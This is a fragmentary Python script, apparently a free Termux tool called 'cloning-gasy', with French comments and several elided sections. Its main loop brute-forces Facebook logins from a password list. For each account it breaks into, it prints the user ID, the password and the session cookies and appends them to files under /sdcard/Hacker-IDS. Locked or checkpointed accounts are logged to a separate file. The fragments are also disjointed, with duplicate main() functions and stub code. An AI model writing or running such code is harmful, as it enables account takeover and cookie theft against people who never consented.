...
user_agent_data = '''
{
  ...
  "json-guid": "8898047e-c0da-47ac-a8e4-ea02da1a875f",
  "json-forced": false
}
'''
user_agent = json.loads(user_agent_data)
...
def main():
    ...
    if code_stocke:
        ...
        if verifier_code_binaire(code_entre):
            ...
            print("Code incorrect. Le script continue.")
...
def main():
    print("Bienvenue dans l'outil !")
    print("Appuie sur 1 pour ouvrir le commandeur.")
    choix = input("Appuie sur la touche correspondante : ")
...
def ouvrir_commandeur():
    # Mettre ici le code pour ouvrir le commandeur
    print("Ouverture du commandeur...")
...
{warna}--------------------------------------------{B}
 Owner    : {M}Princi Sz{M}
 TOOL NAME : {warna}{P}cloning-gasy{P}{warna}
 GROUPE-FB   : [TERMUX-COMAND]
 STATUE : {H}FREE{H}
 Facebook : {bblack}Princi Sz{bblack}
        ...
        for pas in passlist:
            ...
            if 'session_key' in reqx:
                ...
                if str(uid) in oks:
                    ...
                    print('\r\r \033[1;32m[Hacker-OK] '+str(uid)+' | '+pas+'\033[1;37m')
                    coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
                    print('\033[1;32m [COOKIES] '+coki)
                    # Vérifier si le dossier Hacker-IDS existe et le créer si nécessaire
                    if not os.path.exists("/sdcard/Hacker-IDS"):
                        os.makedirs("/sdcard/Hacker-IDS")
                    # Enregistrer dans le fichier Hacker-OK.txt
                    with open(os.path.join("/sdcard/Hacker-IDS", "Hacker-OK.txt"), 'a') as f:
                        f.write(str(uid)+'|'+pas+'|'+coki+'\n')
                    oks.append(str(uid))
                    break
            elif 'www.facebook.com' in reqx['error_msg']:
                print('\r\r \033[1;30m[ITACHI-CP] '+ids+' | '+pas+'\033[1;37m')
                # Enregistrer dans le fichier Hacker-CP.txt
                with open(os.path.join("/sdcard/Hacker-IDS", "Hacker-CP.txt"), 'a') as f:
                    f.write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
...
# Appel à la fonction MR_Hacker pour démarrer le programme
MR_Hacker() 